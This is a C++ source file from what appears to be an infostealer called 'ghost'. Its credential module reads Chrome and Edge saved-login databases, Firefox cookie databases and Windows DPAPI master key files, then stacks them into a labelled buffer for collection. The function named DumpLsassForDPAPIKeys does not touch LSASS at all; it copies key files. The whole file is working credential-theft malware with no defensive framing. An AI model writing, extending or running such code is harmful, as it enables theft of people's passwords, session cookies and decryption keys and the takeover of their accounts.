#include "collector.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>

#pragma comment(lib, "shell32.lib")

namespace ghost {
namespace collector {
namespace creds {

std::string ExpandEnv(const std::string& path) {
    char expanded[MAX_PATH];
    ExpandEnvironmentStringsA(path.c_str(), expanded, MAX_PATH);
    return std::string(expanded);
}
bool GrabFile(const std::string& path, const std::string& header) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    
    std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    if (data.empty()) return false;
    
    std::string fullHeader = "\n--- " + header + " ---\n";
    AppendToBuffer((const uint8_t*)fullHeader.c_str(), fullHeader.size());
    AppendToBuffer(data.data(), data.size());
    return true;
}

bool RipChromeLogins() {
    std::string path = ExpandEnv("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data");
    return GrabFile(path, "CHROME_SQLITE_DB");
}

bool RipEdgeLogins() {
    std::string path = ExpandEnv("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data");
    return GrabFile(path, "EDGE_SQLITE_DB");
}

bool RipFirefoxCookies() {
    std::string path = ExpandEnv("%APPDATA%\\Mozilla\\Firefox\\Profiles\\");
    try {
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (entry.is_directory()) {
                std::string cookiePath = entry.path().string() + "\\cookies.sqlite";
                if (GrabFile(cookiePath, "FIREFOX_COOKIES_" + entry.path().filename().string())) return true;
            }
        }
    } catch(...) {}
    return false;
}

bool DumpLsassForDPAPIKeys() {
    std::string path = ExpandEnv("%APPDATA%\\Microsoft\\Protect\\");
    try {
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (entry.is_directory()) {
                for (const auto& keyFile : std::filesystem::directory_iterator(entry.path())) {
                    GrabFile(keyFile.path().string(), "DPAPI_MASTER_KEY");
                }
            }
        }
        return true;
    } catch(...) {}
    return false;
}

} // namespace creds
} // namespace collector
} // namespace ghost